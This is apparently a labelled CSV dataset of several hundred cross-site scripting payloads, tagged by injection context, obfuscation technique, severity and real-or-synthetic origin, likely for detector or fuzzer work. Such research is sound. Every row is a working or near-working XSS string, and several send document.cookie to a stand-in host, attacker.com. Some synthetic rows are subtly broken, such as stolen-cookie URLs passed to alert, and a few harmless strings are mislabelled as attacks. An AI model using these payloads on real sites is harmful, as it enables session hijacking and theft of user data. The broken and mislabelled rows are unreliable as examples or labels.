payload,context,technique,severity,length,source
"""><img src=x oninput=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,64,synthetic
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onwebkitanimationend=""alert(1)""></summary>",tag_injection,none,medium,105,real
"""><img src=x onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt('XSS')>",attribute_escape,synthetic,low,84,synthetic
"""><img src=x onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,64,synthetic
"JavA
sCriPt:ConSolE.lOg(DocUmeNt.DomAin)",js_uri,synthetic,medium,40,synthetic
\' onanimationiteration=console.log(1)//,attribute_escape,synthetic,medium,40,synthetic
__${alert(document.cookie)}__::.x,template_injection,synthetic,high,33,synthetic
' %3E%3Csvg onscrollsnapchange=prompt(location.hash)%3E,attribute_escape,synthetic,medium,55,synthetic
<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>,tag_injection,none,medium,64,real
""" ><svg ongotpointercapture=alert(document.domain)>",attribute_escape,synthetic,medium,51,synthetic
<scRipT>pRomPt('XSS')</sCriPt>,script_injection,synthetic,medium,30,synthetic
"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></menuitem>",tag_injection,none,medium,176,real
\%27 onpointermove=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,38,synthetic
"EvaL(""ProMpt(doCumEnt.coOkiE)"")",dom_sink,synthetic,high,31,synthetic
"__pRotO__[""oNanImaTioNenD""]=prOmpT('XSS')",dom_sink,synthetic,medium,41,synthetic
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>AnonKryptiQuz</style>,tag_injection,none,medium,100,real
"<frameset onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",tag_injection,none,medium,75,real
<!--><MteXt OnsTalLed=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,51,synthetic
"<iframe2 draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",tag_injection,none,medium,92,real
"<animatetransform ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,72,synthetic
\' onreset=console.log('XSS')//,attribute_escape,synthetic,medium,31,synthetic
' oNcuT=cOnfIrm(1) ',attribute_escape,synthetic,medium,20,synthetic
"<head oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</head>",tag_injection,none,medium,71,real
"`><img src=x ontr&#97;nsitionrun=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,90,synthetic
"setInterval(""\u0061lert(String.fromCharCode(88,83,83))"",100)",dom_sink,synthetic,high,60,synthetic
"JavAscRipT:/*-/*`/*\`/*'/*""/**/(/* */oNCliCk=ProMpt(loCatIon.haSh) )//%0D%0A%0D%0A",js_uri,synthetic,medium,82,synthetic
"javascript:""/*`/*\""/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script>",script_injection,comment_injection|case_variation,medium,142,real
"<strong onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</strong>",tag_injection,none,medium,88,real
""" ><svg onc&#97;npl&#97;y=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,74,synthetic
<obJecT sRc=X oNanImaTioNcaNceL=aLerT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,55,synthetic
"<!--><div onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,106,synthetic
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>",tag_injection,none,medium,95,real
oncanplay=console.log&#40;%27XSS%27&#41;,event_handler,synthetic,low,40,synthetic
""" %3E%3Csvg ondragenter=confirm('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
"<command draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</command>",tag_injection,none,medium,72,real
"<input onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</input>",tag_injection,none,medium,70,real
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",generic,html_entity,medium,53,real
<button popovertarget=x>Click me</button><header ontoggle=alert(1) popover id=x>AnonKryptiQuz</header>,tag_injection,none,medium,102,real
\%22 onplay=confirm(document.domain)//,attribute_escape,synthetic,medium,38,synthetic
"<dt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,85,real
"`><img src=x ontouchstart=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
"&quot; onst&#97;ll&#101;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,low,91,synthetic
"<legend oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",tag_injection,none,medium,64,real
document.body.innerHTML=%22<img src=x onerror=fetch(document.cookie+%27&loc=%27+location.href)>%22,dom_sink,synthetic,high,98,synthetic
"""%3E%3Cbase onpointerup=alert(location.hash)%3E",tag_injection,synthetic,medium,47,synthetic
"<s draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</s>",tag_injection,none,medium,79,real
"<small onmouseout=""alert(1)"">AnonKryptiQuz</small>",tag_injection,none,medium,50,real
`><img src=x ontransitionrun=console.log('XSS')>,attribute_escape,synthetic,medium,48,synthetic
&#106;&#97;v&#97;script:consol&#101;.log(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,63,synthetic
"<details onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</details>",tag_injection,none,medium,69,real
"<svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/>",attribute_escape,none,low,67,real
"%3Cselect
onpromptdismiss=console.log(1)%3E",tag_injection,synthetic,medium,43,synthetic
"element.setAttribute(""onclick"",""prompt(1)"")",dom_sink,synthetic,medium,43,synthetic
\' onmousewheel=alert(location.hash)//,attribute_escape,synthetic,medium,38,synthetic
"__proto__[""onmous&#101;up""]=confirm(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,medium,136,synthetic
"""><img src=x onpopstate=\u0061lert(location.hash)>",attribute_escape,synthetic,low,50,synthetic
"<m&#97;rqu&#101;&#101; onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,193,synthetic
<link onpointerover=alert(1) style=display:block>AnonKryptiQuz</link>,tag_injection,none,medium,69,real
"loc&#97;tion=""j&#97;v&#97;script:prompt(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,medium,77,synthetic
"OndRop=coNfiRm&#40;StRinG.fRomChaRCoDe(88,83,83)&#41;",event_handler,synthetic,high,53,synthetic
<script onclick=prompt(%27XSS%27) onclick=prompt(%27XSS%27)>,tag_injection,synthetic,medium,60,synthetic
" onpoint&#101;rc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,85,synthetic
"j&#97;v&#97;script:consol&#101;.log/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,80,synthetic
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,tag_injection,none,medium,57,real
"' ><svg ongotpoint&#101;rc&#97;ptur&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,89,synthetic
""" ><svg ons&#101;curitypolicyviol&#97;tion=prompt(1)>",attribute_escape,synthetic,medium,53,synthetic
""" %3E%3Csvg ontransitionrun=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
"<dfn onmouseenter=""alert(1)"">AnonKryptiQuz</dfn>",tag_injection,none,medium,48,real
\%27 onpromptdismiss=prompt(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
 onwebkitanimationend=confirm(document.domain),event_handler,synthetic,medium,46,synthetic
<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>,tag_injection,none,medium,70,real
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)""",dom_sink,synthetic,high,76,synthetic
<auDio/onPopStaTe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
`><img src=x onc&#97;npl&#97;y=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,62,synthetic
"' %3E%3Csvg onscrollsnapchange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
%22><object ontouchstart=console.log(location.hash)>,tag_injection,synthetic,medium,52,synthetic
<emBed x=Y oNmoZfuLlsCreEncHanGe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,62,synthetic
"<m&#97;rqu&#101;&#101;
onk&#101;ydown=confirm(1)>",tag_injection,synthetic,medium,49,synthetic
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",tag_injection,none,medium,115,real
"javascript:/*""/*`/*'/*\""/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame onload=alert()>",script_injection,comment_injection,medium,152,real
"`%3E%3Cimg src=x onscrollend=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
onrepeat=alert&#40;location.hash&#41;,event_handler,synthetic,low,37,synthetic
<td/onwebkitanimationend=prompt('XSS')>,tag_injection,synthetic,medium,39,synthetic
"onpagereveal=javascript:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
<script	>prompt(%27XSS%27)</script>,script_injection,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tbody>",tag_injection,none,medium,110,real
<% \u0061lert('XSS') %>,template_injection,synthetic,low,23,synthetic
"""><Img srC=x onTouChsTarT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"\"" onplaying=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,56,synthetic
' onblur=prompt('XSS') ',attribute_escape,synthetic,medium,24,synthetic
<m&#101;t&#97;	ondrop=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,63,synthetic
"""><Img srC=x onPoiNteRraWupDatE=aLerT(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,53,synthetic
"<fieldset onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",tag_injection,none,medium,78,real
<marquee onpointerover=alert(1) style=display:block>AnonKryptiQuz</marquee>,tag_injection,none,medium,75,real
"<ruby onmouseleave=""alert(1)"">AnonKryptiQuz</ruby>",tag_injection,none,medium,50,real
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=\u0061lert(document.domain)>"")",dom_sink,synthetic,low,89,synthetic
"<td onclick=""alert(1)"">AnonKryptiQuz</td>",tag_injection,none,medium,41,real
\' ontr&#97;nsition&#101;nd=&#97;l&#101;rt(1)//,attribute_escape,synthetic,low,47,synthetic
"<img src=""non-existent-image.jpg"" onerror=""alert(document.cookie);"" />",dom_sink,none,high,70,real
<xss on&#101;nd=prompt('XSS')/>,tag_injection,synthetic,medium,31,synthetic
OngEstUreStaRt=ConFirM&#40;DocUmeNt.DomAin&#41;,event_handler,synthetic,low,47,synthetic
"&quot; onmozfullscreenchange=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,74,synthetic
%22 ><svg onvolumechange=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,44,synthetic
"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable style=display:block>drop here</title>",tag_injection,none,medium,127,real
	onk&#101;ydown=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,37,synthetic
"element.setAttribute(""onclick"",""\u0061lert(document.cookie)"")",dom_sink,synthetic,high,61,synthetic
'%3E%3Cimg src=x onchange=console.log(1)%3E,attribute_escape,synthetic,medium,43,synthetic
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></footer>",tag_injection,none,medium,116,real
"<u onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,55,real
"<maRquEe/OncLosE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,56,synthetic
"<image3 draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,90,real
"\"" onbeforepaste=console.log('XSS')//",attribute_escape,synthetic,medium,37,synthetic
"<noscript onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",tag_injection,none,medium,77,real
OnlOad=alErt/*x*/(DocUmeNt.DomAin),event_handler,synthetic,low,34,synthetic
%3Cmath ondragover=prompt(1)%3E,tag_injection,synthetic,medium,31,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onpromptdismiss"":f&#101;tch})",dom_sink,synthetic,low,61,synthetic
&#106;AvaScrIpt:coNfiRm('XSS'),js_uri,synthetic,medium,30,synthetic
%3Canimate	onwebkitfullscreenchange=console.log(1)%3E,tag_injection,synthetic,medium,53,synthetic
"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<teMplAte/onResEt=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,39,synthetic
"<rt oncut=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",tag_injection,none,medium,55,real
' onplaying=alert(location.hash) ',attribute_escape,synthetic,medium,34,synthetic
<nav onpointerup=alert(1) style=display:block>AnonKryptiQuz</nav>,tag_injection,none,medium,65,real
"<noembed onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",tag_injection,none,medium,67,real
%3Canimatetransform onpointerdown=prompt(1)%3E,tag_injection,synthetic,medium,46,synthetic
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,tag_injection,none,medium,70,real
"s&#101;tTim&#101;out(""XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink,synthetic,high,111,synthetic
%27><img src=x oncopy=prompt(document.domain)>,attribute_escape,synthetic,medium,46,synthetic
"\' onpl&#97;ying=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,73,synthetic
"<xsS/oNanImaTioNstArt=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,61,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></optgroup>",tag_injection,none,low,185,real
&quOt; onBegIn=ConFirM(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,46,synthetic
"""><svg onScroll=""javascript:alert(1)//",js_uri,none,medium,38,real
"<td draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,82,real
\%22 onmozfullscreenchange=alert(1)//,attribute_escape,synthetic,medium,37,synthetic
"%3Cvideo/onpaste=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,56,synthetic
<!--><AreA oNloAd=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,47,synthetic
'><Img srC=x onTouCheNd=AleRt('XSS')>,attribute_escape,synthetic,medium,37,synthetic
"onw&#101;bkittr&#97;nsition&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,90,synthetic
"<rt onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",tag_injection,none,medium,65,real
redirect.asp?url=javascript://%250Aalert(document.domain),dom_sink,url_encoding,medium,57,real
onpause=javascript:prompt(location.hash),event_handler,synthetic,medium,40,synthetic
"setTimeout(%22XMLHttpRequest(%27XSS%27)%22,0)",dom_sink,synthetic,high,45,synthetic
"<script
>console.log('XSS')</script>",script_injection,synthetic,medium,36,synthetic
"<style ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</style>",tag_injection,none,medium,91,real
"<button onmouseout=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,52,real
' onanimationiteration=console.log(document.domain) ',attribute_escape,synthetic,medium,53,synthetic
"setTimeout(""alert(document.cookie)"",0)",dom_sink,synthetic,high,38,synthetic
"%27 ><svg onanimationiteration=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,74,synthetic
"<source ondblclick=""alert(1)"">AnonKryptiQuz</source>",tag_injection,none,medium,52,real
"<textarea draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</textarea>",tag_injection,none,medium,72,real
\%22 onpageshow=console.log(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable style=display:block>drop here</option>",tag_injection,none,medium,129,real
onerror=console.log&#40;%27XSS%27&#41;,event_handler,synthetic,low,38,synthetic
"<marquee onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",tag_injection,none,medium,72,real
<script>confirm`'XSS'`</script>,script_injection,synthetic,low,31,synthetic
<th onpointerdown=alert(1) style=display:block>AnonKryptiQuz</th>,tag_injection,none,medium,65,real
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,89,real
"__proto__[""onpoint&#101;rmov&#101;""]=consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,90,synthetic
"<div draggable=""true"" contenteditable>drag me</div><video2 ondrop=alert(1) contenteditable style=display:block>drop here</video2>",tag_injection,none,medium,129,real
 oninv&#97;lid=confirm(1),event_handler,synthetic,medium,25,synthetic
 onscrollsnapchange=alert(location.hash),event_handler,synthetic,medium,40,synthetic
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",tag_injection,none,medium,101,real
"<!--><ifr&#97;m&#101; ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,86,synthetic
<titl&#101;/onblur=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,59,synthetic
&quot; onblur=alert(document.domain) x=&quot;,attribute_escape,synthetic,medium,45,synthetic
#{aLerT('XSS')},template_injection,synthetic,medium,15,synthetic
"<style>:target {color: red;}</style><video id=x style=""transition:color 10s"" ontransitioncancel=print()></video>",tag_injection,none,low,112,real
"'><img src=x onpopst&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,81,synthetic
"<script
>prompt(%27XSS%27)</script>",script_injection,synthetic,medium,35,synthetic
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable style=display:block>drop here</video>",tag_injection,none,medium,131,real
""" ><svg onbeforetoggle=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
&quot; onpopstate=confirm(document.domain) x=&quot;,attribute_escape,synthetic,medium,51,synthetic
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,81,real
{{ prompt(docum&#101;nt.dom&#97;in) }},template_injection,synthetic,medium,38,synthetic
""" ><svg onanimationiteration=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
&quOt; onCloSe=AleRt(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,46,synthetic
&quot; onkeydown=\u0061lert(location.hash) x=&quot;,attribute_escape,synthetic,low,51,synthetic
"<xmp src=x onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,69,synthetic
"<spacer draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,89,real
`><img src=x onpaste=confirm('XSS')>,attribute_escape,synthetic,medium,36,synthetic
"<label onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,86,real
""" oNbeGin=coNfiRm(1) """,attribute_escape,synthetic,medium,22,synthetic
"location=""javascript:eval(document.domain)""",dom_sink,synthetic,high,43,synthetic
onlo&#97;d=&#97;l&#101;rt/*x*/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,56,synthetic
"<rt onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",tag_injection,none,medium,60,real
<script>alert('\u0031')</script>,script_injection,unicode_escape,medium,32,real
"%3Cembed
onmouseenter=confirm('XSS')%3E",tag_injection,synthetic,medium,39,synthetic
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",tag_injection,none,medium,168,real
%3Caudio src=x onmouseover=console.log('XSS')%3E,tag_injection,synthetic,medium,48,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#97;l&#101;rt(1)"")",dom_sink,synthetic,low,76,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:confirm('XSS')""",dom_sink,synthetic,medium,58,synthetic
"%3Cscript
onkeydown=confirm(document.domain)%3E",tag_injection,synthetic,medium,47,synthetic
"""%3E%3Cscript%3Econfirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,67,synthetic
"<address draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</address>",tag_injection,none,medium,92,real
<article onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</article>,tag_injection,none,medium,80,real
"<shadow onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,71,real
"""><pl&#97;int&#101;xt onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,96,synthetic
<SCRIPT>\u0061lert(document.domain)</SCRIPT>,script_injection,synthetic,low,44,synthetic
"(new Function(%22alert(String.fromCharCode(88,83,83))%22))();",dom_sink,synthetic,high,61,synthetic
 onwebkitfullscreenchange=prompt(document.domain),event_handler,synthetic,medium,49,synthetic
""" ><svg onplaying=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,55,synthetic
"<noScrIpt x=Y oNbeForEmaTch=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,67,synthetic
"#""><svg onload=alert(1)>",tag_injection,none,medium,24,real
""" onpromptdismiss=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,low,60,synthetic
'%3E%3Cimg src=x onmousedown=console.log('XSS')%3E,attribute_escape,synthetic,medium,50,synthetic
"<strike draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",tag_injection,none,medium,88,real
<scr	ipt>/*/confirm(document.domain)</scr	ipt>,script_injection,synthetic,medium,46,synthetic
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,tag_injection,none,medium,74,real
%3Cscript%3Ewindow['alert'](1)%3C/script%3E,script_injection,synthetic,low,43,synthetic
<noembed onpointermove=alert(1) style=display:block>AnonKryptiQuz</noembed>,tag_injection,none,medium,75,real
%3csvg/onload=window%5b%22al%22+%22ert%22%5d1337`%3e,event_handler,url_encoding,low,52,real
""" ><svg on&#101;nd&#101;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,74,synthetic
OntRanSitIonStaRt=ConSolE.lOg&#40;'XSS'&#41;,event_handler,synthetic,low,44,synthetic
"DatA:tExt/htMl,<scRipT>cOnfIrm('XSS')</ScrIpt>",js_uri,synthetic,medium,46,synthetic
<input onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</input>,tag_injection,none,medium,76,real
__proto__[%22oncanplay%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,74,synthetic
"<html onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</html>",tag_injection,none,medium,64,real
' ><svg ontouchmove=\u0061lert(location.hash)>,attribute_escape,synthetic,low,46,synthetic
%3Cobject/onbeforepaste=confirm(document.domain)%3E,tag_injection,synthetic,medium,51,synthetic
"<center oncontextmenu=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,55,real
"<rb onmouseup=""alert(1)"">AnonKryptiQuz</rb>",tag_injection,none,medium,43,real
"__pRotO__[""oNmoUseDowN""]=alErt('//atTacKer.coM/?C='+doCumEnt.coOkiE)",dom_sink,synthetic,high,68,synthetic
%22 onauxclick=prompt(location.hash) %22,attribute_escape,synthetic,medium,40,synthetic
"\"" ongestureend=prompt('XSS')//",attribute_escape,synthetic,medium,31,synthetic
"<var onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</var>",tag_injection,none,medium,67,real
%3C!--%3E%3Ca onbeforematch=prompt(document.domain)%3E,tag_injection,synthetic,medium,54,synthetic
